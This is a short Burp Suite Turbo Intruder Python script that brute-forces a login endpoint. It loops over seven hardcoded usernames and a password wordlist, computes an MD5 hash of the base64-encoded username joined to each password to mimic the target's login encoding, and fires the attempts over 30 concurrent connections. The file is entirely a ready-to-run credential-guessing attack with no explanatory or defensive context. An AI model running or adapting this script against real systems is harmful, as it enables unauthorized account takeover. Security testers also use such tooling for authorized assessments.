# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
import hashlib
import base64
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

#    for i in range(2):
#        engine.queue(target.req, ["demo","123123"], learn=1)
#        engine.queue(target.req, target.baseInput, learn=2)
    
    for username in ["demo", "wangwei", "lilei", "ligang", "liuqian", "lijun", "yanglin"]:
        for word in open("/Users/cyal1/github.com/SCRIPT/dictionaries/password/password-1030.txt"):
            m2 = hashlib.md5() # do not move
            m2.update(base64.b64encode(username) + word.strip())
    #        print( m2.hexdigest(), base64.b64encode('demo') + word.strip() )
            engine.queue(target.req, [ username, m2.hexdigest()])


def handleResponse(req, interesting):
#    if interesting:
        table.add(req)
